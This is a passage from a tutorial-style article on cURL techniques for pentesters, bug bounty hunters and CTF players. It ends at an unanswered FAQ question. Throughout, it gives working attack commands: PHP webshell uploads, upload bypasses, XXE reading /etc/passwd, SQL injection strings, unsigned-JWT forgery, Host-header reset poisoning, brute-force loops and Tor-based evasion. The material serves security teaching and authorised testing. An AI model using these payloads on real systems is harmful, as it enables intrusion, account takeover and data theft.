# Advanced cURL Commands for Pentesters, Bug Bounty Hunters, and CTF Players

> **Cover Image Suggestion:** A dark terminal screen filled with green-on-black cURL commands, a magnifying glass overlaid on an HTTP response dump, and subtle network packet visualizations in the background. Text overlay: *"The Pentester's Swiss Army Knife."*

---

*By @INTELEON404 | 18 min read*

---

## Introduction: Why cURL is Still the Pentester's Best Friend in 2026

In an era of flashy GUI tools, browser extensions, and AI-assisted recon platforms, it is tempting to overlook the humble command-line HTTP client that has powered security research for over two decades. Yet `curl` — Client URL — remains not just relevant but *indispensable* to every serious pentester, bug bounty hunter, and CTF player in 2026.

Why? Because cURL offers something no GUI tool can fully replicate: **absolute, surgical control over every byte of an HTTP request.** When Burp Suite's proxy intercept is slow, when a WAF fingerprints your browser's TLS fingerprint, when a CTF challenge demands a custom `X-Forwarded-For` header at 2 AM with no internet connection — cURL is there.

It is available on virtually every platform (Linux, macOS, Windows, BSD, embedded devices), pre-installed on most servers, scriptable, pipeable, and extraordinarily powerful. For security professionals, it is not a backup tool. It is a primary weapon.

This guide covers the full spectrum: from header inspection to host header injection, from cookie manipulation to CORS bypass testing, from bug bounty recon workflows to CTF tricks. Every technique includes real commands, sample outputs, and actionable security implications.

> **Note:** All techniques in this article are for **authorized, ethical testing only.** Always obtain explicit written permission before testing any system you do not own. Unauthorized access is illegal and unethical.

---

## Understanding HTTP Requests with cURL

Before diving into advanced techniques, understand cURL's anatomy. Every HTTP interaction has three phases: **request**, **response headers**, and **response body**. cURL can inspect and manipulate all three independently.

```bash
# Basic syntax
curl [options] [URL]

# Most commonly used flags
-v          # Verbose: show full request + response headers
-s          # Silent: suppress progress meter
-o FILE     # Write output to file
-O          # Write output to file named after remote file
-I          # Fetch headers only (HEAD request)
-i          # Include response headers in output
-X METHOD   # Specify HTTP method
-H "Header: Value"   # Add custom header
-d "data"   # Send POST data
-b "cookie" # Send cookies
-c FILE     # Save cookies to file
-L          # Follow redirects
-k          # Skip TLS certificate verification
-x PROXY    # Use proxy
--http2     # Force HTTP/2
```

Understanding request flow matters for security testing. cURL sends requests in plain text (or TLS-encrypted), making its behavior entirely predictable and reproducible — a quality that browser-based tools cannot guarantee due to browser-specific logic like HSTS preloading, automatic CORS preflight handling, and credential management.

---

## Viewing Headers and Responses

**Purpose:** Inspect server response headers for security misconfigurations, information disclosure, and fingerprinting opportunities.

**When to use it:** First step of any engagement. Headers reveal framework, server version, security policy configuration, and caching behavior.

```bash
# Fetch only response headers (HEAD request)
curl -sI https://target.com

# Include headers with body output
curl -si https://target.com

# Verbose mode — shows full request AND response headers
curl -sv https://target.com 2>&1

# Show only specific headers using grep
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-frame\|content-security"
```

**Sample output:**

```
HTTP/2 200
server: nginx/1.18.0 (Ubuntu)
date: Mon, 02 Jun 2026 10:14:22 GMT
content-type: text/html; charset=UTF-8
x-powered-by: PHP/7.4.33
x-frame-options: SAMEORIGIN
content-security-policy: default-src 'self'
x-content-type-options: nosniff
strict-transport-security: max-age=31536000
```

**Security implications:** `X-Powered-By: PHP/7.4.33` immediately signals an outdated PHP version with known CVEs. `server: nginx/1.18.0` confirms the web server version. Missing `X-Frame-Options` or a weak CSP indicates clickjacking or XSS escalation potential. This single cURL command gives more actionable intel than most vulnerability scanners.

---

## Following Redirects

**Purpose:** Trace the full redirect chain to identify open redirects, insecure redirect destinations, or redirect-based authentication bypasses.

**When to use it:** Login flows, OAuth callbacks, URL shorteners, and any endpoint that issues `3xx` responses.

```bash
# Follow all redirects
curl -sIL https://target.com/login

# Verbose redirect chain (shows each hop)
curl -sv --max-redirs 10 -L https://target.com/redirect?url=https://evil.com 2>&1

# Show only final destination
curl -sIL https://target.com/link | grep -i "^location:"
```

**Sample output (open redirect test):**

```
> GET /redirect?url=https://evil.com HTTP/1.1
< HTTP/1.1 302 Found
< Location: https://evil.com
```

**Security implications:** If a server blindly redirects to a user-supplied `url` parameter without validation, that is an open redirect — a critical auxiliary finding in bug bounty programs, especially when chained with phishing or OAuth token theft.

---

## Custom Request Methods

**Purpose:** Test how servers handle non-standard HTTP methods, enabling discovery of method-based bypasses and misconfigurations.

**When to use it:** Testing REST APIs, bypassing access controls, probing for dangerous methods like `TRACE`, `PUT`, or `DELETE`.

```bash
# OPTIONS — enumerate allowed methods
curl -sI -X OPTIONS https://target.com/api/users

# PUT — test unauthorized file upload
curl -X PUT -d "<?php system($_GET['cmd']); ?>" https://target.com/shell.php

# TRACE — test for XST (Cross-Site Tracing)
curl -X TRACE https://target.com

# DELETE — test unauthorized deletion
curl -X DELETE https://target.com/api/users/1

# PATCH — partial update testing
curl -X PATCH -H "Content-Type: application/json" -d '{"role":"admin"}' https://target.com/api/profile
```

**Sample output (OPTIONS):**

```
HTTP/2 200
allow: GET, POST, PUT, DELETE, OPTIONS
access-control-allow-methods: GET, POST, PUT, DELETE
```

**Security implications:** A server exposing `PUT` or `DELETE` on production endpoints without proper authorization is a critical vulnerability. `TRACE` enabled with user-controllable headers can facilitate Cross-Site Tracing (XST) attacks to steal cookies even with `HttpOnly` set.

---

## Custom Headers

**Purpose:** Inject custom headers to test header-based bypasses, simulate proxies, and probe header injection vulnerabilities.

**When to use it:** IP restriction bypass, WAF evasion, cache poisoning, host header attacks.

```bash
# Simulate trusted internal IP
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin

# Multiple IP bypass headers
curl -H "X-Real-IP: 10.0.0.1" \
     -H "X-Originating-IP: 127.0.0.1" \
     -H "X-Remote-IP: 127.0.0.1" \
     -H "X-Client-IP: 127.0.0.1" \
     https://target.com/admin

# Custom User-Agent (evade bot detection or test UA-based logic)
curl -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
     https://target.com/

# Inject header for cache poisoning test
curl -H "X-Forwarded-Host: evil.com" https://target.com/
```

**Security implications:** Many applications trust `X-Forwarded-For` without validation, allowing IP-based access controls to be bypassed. Cache poisoning via `X-Forwarded-Host` can persist malicious content for legitimate users.

---

## Authentication Testing

**Purpose:** Test authentication mechanisms — Basic Auth, Bearer tokens, API keys, and digest authentication.

**When to use it:** Login endpoint testing, API authentication bypass, credential stuffing simulation.

```bash
# Basic Authentication
curl -u admin:password https://target.com/admin

# Bearer Token (JWT/OAuth)
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
     https://target.com/api/profile

# API Key in header
curl -H "X-API-Key: sk_live_abc123xyz" https://target.com/api/data

# API Key in query string
curl "https://target.com/api/data?api_key=sk_live_abc123xyz"

# Digest Authentication
curl --digest -u user:pass https://target.com/secure/

# Test no-auth access (baseline)
curl -si https://target.com/api/admin/users

# Test broken object-level authorization
curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/users/1
curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/users/2
```

**Sample output (BOLA/IDOR test):**

```json
{"id": 2, "email": "admin@target.com", "role": "superadmin", "ssn": "***-**-4321"}
```

**Security implications:** Broken Object Level Authorization (BOLA/IDOR) is the #1 API vulnerability per OWASP API Top 10. Iterating over user IDs with another user's token — and receiving valid responses — constitutes a critical severity finding worth significant bug bounty payouts.

---

## Cookie Manipulation

**Purpose:** Test session management, cookie theft simulation, privilege escalation via cookie tampering.

**When to use it:** Session fixation testing, forged session cookies, role escalation.

```bash
# Send a specific cookie
curl -b "session=abc123; role=admin" https://target.com/dashboard

# Save cookies from response to file
curl -c cookies.txt -b cookies.txt https://target.com/login \
     -d "username=admin&password=password"

# Load saved cookies and use them
curl -b cookies.txt https://target.com/admin

# Manipulate JWT in cookie
curl -b "auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
     https://target.com/admin

# Test cookie scope — does the server accept cookies from a subdomain?
curl -b "session=STOLEN_TOKEN" -H "Host: app.target.com" https://target.com/
```

**Security implications:** JWT `none` algorithm attacks (as shown above) exploit servers that accept unsigned tokens. If `role: admin` in an unsigned JWT grants admin access, that is a critical authentication bypass. Cookie jar files (`-c/-b`) simulate real browser sessions for testing multi-step flows.

---

## JSON API Testing

**Purpose:** Test REST APIs for injection, BOLA, mass assignment, and improper input validation.

**When to use it:** API security testing, bug bounty on API-heavy applications.

```bash
# POST JSON data
curl -X POST https://target.com/api/users \
     -H "Content-Type: application/json" \
     -d '{"username":"test","email":"test@test.com","role":"admin"}'

# Test mass assignment (inject unexpected fields)
curl -X PUT https://target.com/api/profile \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","email":"test@test.com","isAdmin":true,"balance":999999}'

# GraphQL introspection
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name } } }"}'

# SQL injection test in JSON body
curl -X POST https://target.com/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin'\''--","password":"anything"}'

# Pretty-print JSON response
curl -s https://target.com/api/users | python3 -m json.tool
```

**Sample output (mass assignment success):**

```json
{
  "id": 42,
  "username": "test",
  "email": "test@test.com",
  "isAdmin": true,
  "balance": 999999,
  "updated": true
}
```

**Security implications:** If the API accepts and persists `isAdmin: true`, that is a critical mass assignment vulnerability. The server failed to whitelist acceptable fields, allowing privilege escalation via a single API call.

---

## File Upload Testing

**Purpose:** Test file upload endpoints for unrestricted file upload, path traversal, and MIME-type bypass vulnerabilities.

**When to use it:** Anytime an application accepts file uploads.

```bash
# Basic file upload (multipart form)
curl -X POST https://target.com/upload \
     -F "file=@shell.php" \
     -F "name=shell"

# MIME type bypass (server checks Content-Type, not file extension)
curl -X POST https://target.com/upload \
     -F "file=@shell.php;type=image/jpeg"

# Filename path traversal
curl -X POST https://target.com/upload \
     -F "file=@payload.php" \
     -F "filename=../../../../var/www/html/shell.php"

# Upload with authentication
curl -X POST https://target.com/api/upload \
     -H "Authorization: Bearer TOKEN" \
     -F "avatar=@webshell.php;type=image/png"

# Double extension bypass
curl -X POST https://target.com/upload \
     -F "file=@shell.php.jpg"
```

**Security implications:** Unrestricted file upload leading to Remote Code Execution (RCE) is a critical/P1 vulnerability. MIME-type bypass and double-extension attacks are commonly missed by naive server-side validation that only checks `Content-Type` headers rather than actual file content (magic bytes).

---

## CORS Testing

**Purpose:** Identify misconfigured Cross-Origin Resource Sharing policies that allow unauthorized cross-origin access to sensitive APIs.

**When to use it:** API endpoints, authenticated resources, financial data endpoints.

```bash
# Basic CORS probe — set arbitrary Origin
curl -sI -H "Origin: https://evil.com" https://target.com/api/profile

# Null origin test (common bypass)
curl -sI -H "Origin: null" https://target.com/api/profile

# Subdomain bypass
curl -sI -H "Origin: https://evil.target.com" https://target.com/api/profile

# Pre-flight request simulation
curl -X OPTIONS https://target.com/api/data \
     -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -H "Access-Control-Request-Headers: Authorization" -si
```

**Sample output (misconfigured CORS):**

```
HTTP/2 200
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE
```

**Security implications:** `Access-Control-Allow-Origin: [reflected attacker origin]` combined with `Access-Control-Allow-Credentials: true` is a critical CORS misconfiguration. An attacker's malicious page can make authenticated API requests on behalf of a victim user and exfiltrate their data. This is a well-rewarded bug bounty finding.

---

## Host Header Testing

**Purpose:** Test for Host header injection leading to password reset poisoning, cache poisoning, or SSRF.

**When to use it:** Password reset flows, any endpoint that uses the `Host` header to construct URLs.

```bash
# Basic Host header injection
curl -H "Host: evil.com" https://target.com/

# Password reset poisoning
curl -X POST https://target.com/forgot-password \
     -H "Host: evil.com" \
     -d "email=victim@target.com"

# X-Forwarded-Host injection (proxy-based Host override)
curl -H "X-Forwarded-Host: evil.com" https://target.com/

# Duplicate Host header
curl -H "Host: target.com" -H "Host: evil.com" https://target.com/

# Port-based bypass
curl -H "Host: target.com:@evil.com" https://target.com/
```

**Sample output (password reset poisoning):**

Victim receives an email:
```
Click to reset your password:
https://evil.com/reset?token=a1b2c3d4e5f6
```

**Security implications:** Password reset poisoning via Host header injection is a high-severity vulnerability. The server generates a reset link using the attacker-controlled `Host` header, sending victims a link to the attacker's domain where the reset token can be harvested.

---

## Virtual Host Discovery

**Purpose:** Discover hidden virtual hosts on a shared IP that respond differently to different `Host` header values.

**When to use it:** During recon on targets with shared hosting, or when IP address enumeration reveals servers not listed in DNS.

```bash
# Manual vhost probing
curl -H "Host: admin.target.com" https://TARGET_IP/ -sk

# Wordlist-based vhost fuzzing (using bash loop)
while read sub; do
  result=$(curl -sI -H "Host: ${sub}.target.com" https://TARGET_IP/ -k | head -1)
  echo "$sub: $result"
done < subdomains.txt

# Check response length differences (sign of different vhost)
for sub in admin dev staging api internal; do
  size=$(curl -sk -H "Host: ${sub}.target.com" https://TARGET_IP/ | wc -c)
  echo "${sub}.target.com: ${size} bytes"
done
```

**Sample output:**

```
admin.target.com: 14823 bytes   # ← very different from default
dev.target.com: 2841 bytes
staging.target.com: 2901 bytes
api.target.com: 892 bytes
internal.target.com: 18294 bytes  # ← another interesting vhost
```

**Security implications:** Internal vhosts (`admin`, `internal`, `dev`) on production IPs often lack authentication and expose administrative interfaces. This technique has uncovered entire unrestricted admin panels in major bug bounty programs.

---

## HTTP/2 and TLS Testing

**Purpose:** Test HTTP/2-specific vulnerabilities, TLS configuration weaknesses, and protocol downgrade attacks.

**When to use it:** During infrastructure review, TLS audit, and HTTP/2 header injection testing.

```bash
# Force HTTP/2
curl --http2 -sv https://target.com 2>&1 | grep -i "http/2\|alpn"

# Force HTTP/1.1 (test downgrade behavior)
curl --http1.1 https://target.com -I

# Show TLS certificate details
curl -sv https://target.com 2>&1 | grep -A5 "Server certificate"

# Test weak TLS versions (TLS 1.0/1.1)
curl --tls-max 1.1 https://target.com -I

# Show cipher suites negotiated
curl -sv https://target.com 2>&1 | grep "SSL connection\|cipher"

# Test certificate validation bypass (for internal testing)
curl -k https://self-signed.target.com -I
```

**Sample output:**

```
* ALPN: offering h2
* ALPN: server accepted h2
* Connected to target.com (93.184.216.34) port 443
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: CN=target.com
*  expire date: Dec 31 2026 23:59:59 GMT
*  issuer: C=US; O=Let's Encrypt; CN=R3
*  SSL certificate verify ok.
```

**Security implications:** Servers accepting TLS 1.0 or 1.1 are vulnerable to POODLE and BEAST attacks. HTTP/2 header injection (via pseudo-header manipulation) can enable request smuggling in specific gateway configurations.

---

## Proxying with Burp Suite

**Purpose:** Route cURL traffic through Burp Suite for interception, modification, and repeater-based testing.

**When to use it:** Complex multi-step flows, WebSocket testing, or when you need both cURL's scriptability and Burp's visual inspection.

```bash
# Route through Burp Suite (default: 127.0.0.1:8080)
curl -x http://127.0.0.1:8080 https://target.com/ -k

# Proxy with credentials (if Burp is authenticated)
curl -x http://user:pass@127.0.0.1:8080 https://target.com/ -k

# Use Burp's CA certificate (avoid -k in production testing)
curl --cacert /path/to/burp-ca.crt https://target.com/ \
     -x http://127.0.0.1:8080

# Send full request through Burp with all relevant headers
curl -x http://127.0.0.1:8080 -k \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"id":1337}' \
     -X POST https://target.com/api/action

# Replay captured request from Burp's Logger
curl -x http://127.0.0.1:8080 -k -sv \
     -H "Host: target.com" \
     -H "Cookie: session=CAPTURED_SESSION" \
     https://target.com/sensitive-action
```

> **Pro Tip:** Export requests from Burp Suite as `Copy as curl command` (right-click in Repeater). This gives you a ready-to-run cURL command that perfectly replicates the captured request including all headers and body.

---

## Response Timing Analysis

**Purpose:** Use response time differences to detect blind SQL injection, blind SSRF, or time-based vulnerabilities.

**When to use it:** When there is no visible output difference but you suspect injection (blind SQLi, blind XSS, SSRF).

```bash
# Time a single request
time curl -s https://target.com/api/users?id=1

# Time-based SQL injection probe
time curl -s "https://target.com/api/users?id=1' AND SLEEP(5)--"

# Measure with curl's built-in timing output
curl -o /dev/null -s -w "DNS: %{time_namelookup}s | Connect: %{time_connect}s | TLS: %{time_appconnect}s | TTFB: %{time_starttransfer}s | Total: %{time_total}s\n" https://target.com/

# Compare timing for valid vs invalid user (username enumeration via timing)
time curl -s -X POST https://target.com/login -d "username=admin&password=wrong"
time curl -s -X POST https://target.com/login -d "username=nonexistent&password=wrong"

# Blind SSRF via DNS timing
time curl -s "https://target.com/fetch?url=http://$(python3 -c 'print("A"*50)').burpcollaborator.net/"
```

**Sample output:**

```
DNS: 0.012s | Connect: 0.034s | TLS: 0.098s | TTFB: 5.423s | Total: 5.441s
```

A `TTFB` of 5.4 seconds on an injected `SLEEP(5)` payload confirms **blind time-based SQL injection**.

**Security implications:** Timing-based vulnerabilities are the most underreported class in bug bounty programs because they require careful measurement and baseline comparison. cURL's `-w` timing template makes this measurable and scriptable.

---

## API Security Testing

**Purpose:** Systematically test REST and GraphQL APIs for OWASP API Top 10 vulnerabilities.

**When to use it:** API-heavy targets, mobile app backends, SaaS platforms.

```bash
# BOLA — access another user's resource
curl -H "Authorization: Bearer YOUR_TOKEN" https://target.com/api/orders/9999

# Excessive data exposure — check for over-returned fields
curl -s -H "Authorization: Bearer TOKEN" https://target.com/api/profile | python3 -m json.tool

# Rate limit test (rapid successive requests)
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -d "username=admin&password=test$i"
done

# GraphQL — disable introspection bypass
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __type(name: \"User\") { fields { name type { name } } } }"}'

# API versioning abuse
curl https://target.com/api/v1/admin/users
curl https://target.com/api/v2/admin/users

# HTTP parameter pollution
curl "https://target.com/api/transfer?to=attacker&to=victim&amount=1000"
```

**Sample output (BOLA — accessing another user's order):**

```json
{
  "order_id": 9999,
  "user_id": 1,
  "email": "victim@target.com",
  "items": [{"product": "MacBook Pro", "price": 2499}],
  "card_last4": "4242",
  "address": "123 Victim St, San Francisco, CA"
}
```

**Security implications:** Accessing order 9999 with your own token and receiving someone else's full PII, payment info, and address is a critical P1 BOLA. This class of vulnerability accounts for the majority of high-severity API bug bounty payouts.

---

## Bug Bounty Recon Techniques

**Purpose:** Use cURL as part of a systematic recon pipeline to identify targets, map attack surface, and discover low-hanging fruit.

**When to use it:** Early-stage bug bounty recon, asset enumeration, technology fingerprinting.

```bash
# Check for common sensitive files
for path in robots.txt sitemap.xml .env config.php wp-config.php .git/config; do
  code=$(curl -so /dev/null -w "%{http_code}" https://target.com/$path)
  echo "$path: HTTP $code"
done

# Extract links from page for further crawling
curl -s https://target.com | grep -oP 'href="[^"]+"' | cut -d'"' -f2

# Discover API endpoints from JavaScript files
curl -s https://target.com/app.js | grep -oP '(?:api|v[0-9]+)/[a-zA-Z0-9/_-]+'

# Check security headers systematically
curl -sI https://target.com | grep -iE "strict-transport|x-frame|x-content-type|content-security|referrer|permissions"

# Subdomain takeover probe (check for NXDOMAIN or misconfigured CNAME)
curl -si https://subdomain.target.com | head -5

# Check for source maps (often expose original source code)
curl -si https://target.com/js/app.js.map

# S3 bucket enumeration
curl https://target-company.s3.amazonaws.com/
curl -H "Host: target-company.s3.amazonaws.com" https://s3.amazonaws.com/

# Wayback Machine recon
curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&limit=50"
```

**Sample output (sensitive file discovery):**

```
robots.txt: HTTP 200
sitemap.xml: HTTP 200
.env: HTTP 200         ← CRITICAL
config.php: HTTP 403
.git/config: HTTP 200  ← CRITICAL
```

**Security implications:** A `200` response on `.env` reveals database credentials, API keys, and secret tokens. A `200` on `.git/config` means the full Git repository may be reconstructible — leaking source code, commit history, and hardcoded secrets.

---

## CTF Tricks with cURL

**Purpose:** Apply cURL's flexibility to solve Capture The Flag challenges that involve HTTP manipulation, encoding tricks, or obscure header requirements.

**When to use it:** Web challenges in CTF competitions.

```bash
# Follow redirect chain and show all intermediate responses
curl -Lsiv "http://ctf.example.com/start" 2>&1

# Decode gzip-compressed response
curl -s --compressed http://ctf.example.com/gzip-challenge

# Send raw binary data
curl -X POST http://ctf.example.com/binary \
     --data-binary $'\x41\x42\x43\x00\xFF'

# Custom method (CTF challenges sometimes use odd verbs)
curl -X FLAG http://ctf.example.com/method-challenge

# Send request with required Referer
curl -H "Referer: http://secret-page.ctf.com" http://ctf.example.com/secret

# Simulate admin cookie (flag in response)
curl -b "role=admin; debug=1; internal=true" http://ctf.example.com/flag

# Extract flag from response headers
curl -sI http://ctf.example.com/flag-in-header | grep -i "x-flag\|ctf\|flag"

# HTTP basic auth brute (small wordlist)
for pass in $(cat wordlist.txt); do
  result=$(curl -su "admin:$pass" http://ctf.example.com/protected)
  if echo "$result" | grep -q "flag"; then
    echo "Password: $pass"
    echo "$result"
    break
  fi
done

# XXE via curl (inject malicious XML)
curl -X POST http://ctf.example.com/xml \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

**CTF real example — flag hidden in redirect:**

```bash
curl -v http://ctf.example.com/redirect 2>&1 | grep "Location:"
# Output:
# < Location: http://ctf.example.com/CTF{r3d1r3ct_s3cr3t}/home
```

---

## Top 25 Advanced cURL Commands Every Pentester Should Know

| # | Command | Explanation | Use Case |
|---|---------|-------------|----------|
| 1 | `curl -sI https://target.com` | Fetch headers only (HEAD) | Technology fingerprinting |
| 2 | `curl -sv https://target.com 2>&1` | Full verbose output | Debug request/response |
| 3 | `curl -x http://127.0.0.1:8080 -k https://target.com` | Proxy through Burp | Intercept & modify |
| 4 | `curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin` | IP bypass | Admin panel access |
| 5 | `curl -b "session=TOKEN" https://target.com/profile` | Send cookie | Session testing |
| 6 | `curl -c cookies.txt -b cookies.txt -L -X POST https://target.com/login -d "u=a&p=b"` | Cookie jar login | Multi-step auth flow |
| 7 | `curl -X OPTIONS -sI https://target.com/api` | Enumerate allowed methods | Method abuse |
| 8 | `curl -H "Origin: https://evil.com" -sI https://target.com/api` | CORS probe | CORS misconfiguration |
| 9 | `curl -H "Host: evil.com" https://target.com/ -sk` | Host header injection | Password reset poisoning |
| 10 | `curl -X PUT -d "@shell.php" https://target.com/uploads/` | File upload via PUT | RCE testing |
| 11 | `curl -F "file=@shell.php;type=image/png" https://target.com/upload` | MIME bypass upload | Unrestricted upload |
| 12 | `curl --http2 -I https://target.com` | Test HTTP/2 support | Protocol testing |
| 13 | `curl --tls-max 1.1 https://target.com -I` | Force TLS 1.1 | Weak TLS detection |
| 14 | `curl -o /dev/null -s -w "%{time_total}\n" https://target.com/api?id=1'%20AND%20SLEEP(5)--` | Timed SQLi probe | Blind injection |
| 15 | `curl -s https://target.com/.env` | Sensitive file check | Info disclosure |
| 16 | `curl -s https://target.com/.git/config` | Git exposure check | Source code leak |
| 17 | `curl -u admin:admin https://target.com/admin/` | Basic auth brute | Default credentials |
| 18 | `curl -X POST https://target.com/api -H "Content-Type: application/json" -d '{"isAdmin":true}'` | Mass assignment | Privilege escalation |
| 19 | `curl -H "Authorization: Bearer null" https://target.com/api/data` | Null token test | Auth bypass |
| 20 | `curl -s "https://target.com/api/users?id=1 UNION SELECT null,null,@@version--"` | URL SQLi test | Database extraction |
| 21 | `curl -X POST https://target.com/graphql -d '{"query":"{ __schema { types { name } } }"}'` | GraphQL introspection | API mapping |
| 22 | `curl -H "X-HTTP-Method-Override: DELETE" -X POST https://target.com/resource/1` | Method override | Bypass method restrictions |
| 23 | `curl --resolve target.com:443:192.168.1.1 https://target.com/ -k` | Custom DNS resolution | Vhost testing |
| 24 | `curl -A "" https://target.com/` | Blank User-Agent | Bot detection bypass |
| 25 | `curl -s "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text"` | Wayback recon | Historical endpoint discovery |

---

## cURL + Burp Suite Workflow for Bug Bounty Hunting

A professional bug bounty workflow combining cURL's scripting power with Burp's visual analysis:

### Step 1: Initial Recon with cURL

```bash
# Map the attack surface
curl -sI https://target.com | tee headers.txt
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

### Step 2: Authenticate and Capture Session

```bash
# Login and capture cookies
curl -c session.txt -X POST https://target.com/login \
  -d "username=YOUR_ACCOUNT&password=YOUR_PASSWORD" -L

# Verify session works
curl -b session.txt https://target.com/api/profile
```

### Step 3: Route Through Burp for Deep Inspection

```bash
# All subsequent requests go through Burp
curl -b session.txt -x http://127.0.0.1:8080 -k \
  https://target.com/api/profile
```

### Step 4: Automate Endpoint Testing

```bash
# Probe all discovered endpoints
endpoints=("users" "orders" "admin" "settings" "billing")
for ep in "${endpoints[@]}"; do
  echo "=== /api/$ep ==="
  curl -sb session.txt -x http://127.0.0.1:8080 -k \
    https://target.com/api/$ep | python3 -m json.tool 2>/dev/null | head -20
done
```

### Step 5: Use Burp Repeater for Deep Dives

Right-click any interesting request in Burp's HTTP history → Send to Repeater. Use Burp's `Copy as curl command` to export for scripting.

### Step 6: Document Findings

```bash
# Save evidence for bug report
curl -b session.txt https://target.com/api/users/9999 \
  -o evidence_bola.json -D evidence_headers.txt
```

> **Pro Tip:** Use `--output /dev/null -w "%{http_code}"` for quick status-code scanning, then route only interesting endpoints through Burp for full inspection.

---

## Common Mistakes and OPSEC Considerations

### Common Mistakes

**1. Forgetting `-k` with HTTPS proxying**
When proxying through Burp, cURL sees Burp's self-signed cert. Always use `-k` or add Burp's CA with `--cacert`.

**2. Ignoring HTTP vs HTTPS**
Some redirects drop to HTTP, exposing session cookies. Use `-v` to watch for protocol downgrades.

**3. Missing `Content-Type` on JSON requests**
Without `-H "Content-Type: application/json"`, many APIs reject the request or misparse the body.

**4. Not URL-encoding special characters**
Special characters in URL parameters must be encoded. Use `--data-urlencode` or pipe through `python3 -c "import urllib.parse; print(urllib.parse.quote('payload'))"`.

**5. Not checking response size, only status code**
A `403` might return a full page of data in the body. Always inspect the response body, not just the status code.

### OPSEC Considerations

```bash
# Use a VPN or Tor for sensitive recon
curl --socks5 127.0.0.1:9050 https://target.com/

# Randomize User-Agent
USER_AGENTS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64)..." "curl/7.68.0")
curl -A "${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}" https://target.com/

# Add delays between requests to avoid rate-limit detection
for endpoint in "${endpoints[@]}"; do
  curl ... https://target.com/api/$endpoint
  sleep $((RANDOM % 3 + 1))
done

# Never use your personal IP on bug bounty programs
# Use a dedicated VPS or cloud egress IP
```

> **Warning:** Even on authorized bug bounty programs, high-volume automated scanning can violate program rules. Always check the program's testing guidelines. Aggressive scanning may result in IP bans or disqualification from rewards.

---

## Best Practices and Pro Tips

**1. Always save evidence**
```bash
curl -sv https://target.com/vulnerability 2>&1 | tee evidence_$(date +%s).txt
```

**2. Use format strings for benchmarking**
```bash
curl -o /dev/null -s -w "Total: %{time_total}s | Size: %{size_download} bytes | Code: %{http_code}\n"
```

**3. Pipe JSON through `jq` for clean output**
```bash
curl -s https://target.com/api/users | jq '.[] | {id: .id, email: .email, role: .role}'
```

**4. Encode payloads properly**
```bash
curl --data-urlencode "search=<script>alert(1)</script>" https://target.com/search
```

**5. Use heredocs for complex JSON**
```bash
curl -X POST https://target.com/api -H "Content-Type: application/json" -d @- <<'EOF'
{
  "username": "admin",
  "password": "' OR 1=1--",
  "rememberMe": true
}
EOF
```

**6. Test both authenticated and unauthenticated versions of every endpoint**

**7. Check all 4xx responses — a `403` often means "authenticated, wrong role" not "nonexistent"**

**8. Use `--resolve` to test specific servers in a load-balanced pool**
```bash
curl --resolve target.com:443:10.10.10.5 https://target.com/admin -k
```

---

## Troubleshooting Guide

| Problem | Cause | Solution |
|---------|-------|----------|
| `SSL certificate problem` | Self-signed cert or CA mismatch | Use `-k` or `--cacert /path/to/ca.crt` |
| `Empty reply from server` | Server closed connection immediately | Add `-v` to debug; check TLS version compatibility |
| `Could not resolve host` | DNS failure | Use `--resolve` or `--dns-servers` |
| `Connection refused` | Port closed or firewall | Verify target is up; check port with `nc -zv target.com 443` |
| `405 Method Not Allowed` | Method not permitted | Try `X-HTTP-Method-Override` header |
| `400 Bad Request` on JSON | Missing `Content-Type` header | Add `-H "Content-Type: application/json"` |
| Request not appearing in Burp | Proxy not routing correctly | Ensure `-x http://127.0.0.1:8080` is set; check Burp is listening |
| `Moved Permanently` loop | Redirect loop | Add `--max-redirs 5` or remove `-L` to inspect |
| Cookie not being sent | Wrong cookie format | Use `-c`/`-b` with a file, or quote the cookie value |
| Response body is binary/garbled | Compressed response | Add `--compressed` flag |

---

## Frequently Asked Questions

**Q1: What is the difference between `-d` and `--data-urlencode`?**

`-d` sends data exactly as specified, requiring you to manually URL-encode special characters. `--data-urlencode` automatically encodes the value portion, making it essential when testing with payloads containing `&`, `=`, `+`, or `<>` characters.

**Q2: How do I test WebSockets with cURL?**

cURL does not support WebSocket (WSS/WS) natively. Use `websocat` (`websocat wss://target.com/ws`) or intercept the WebSocket upgrade request through Burp Suite.

**Q3: How can I send multiline headers with cURL?**

Each header requires its own `-H` flag. There is no multi-line single-header support, but you can stack as many `-H` flags as needed in one command.

**Q4: Can cURL handle OAuth 2.0 flows?**

Yes, for simple flows. Obtain an access token via one cURL request, then pass it as a Bearer token in subsequent requests. Full OAuth flows with browser redirects require scripting the multi-step exchange.

**Q5: What is the best way to script cURL for bulk testing?**

Bash `while read` loops with a file of targets, `xargs -P` for parallel execution, or Python's `subprocess` for more complex logic. For high-volume testing, consider integrating with `ffuf` or `nuclei` instead.

**Q6: How do I handle rate limiting during testing?**

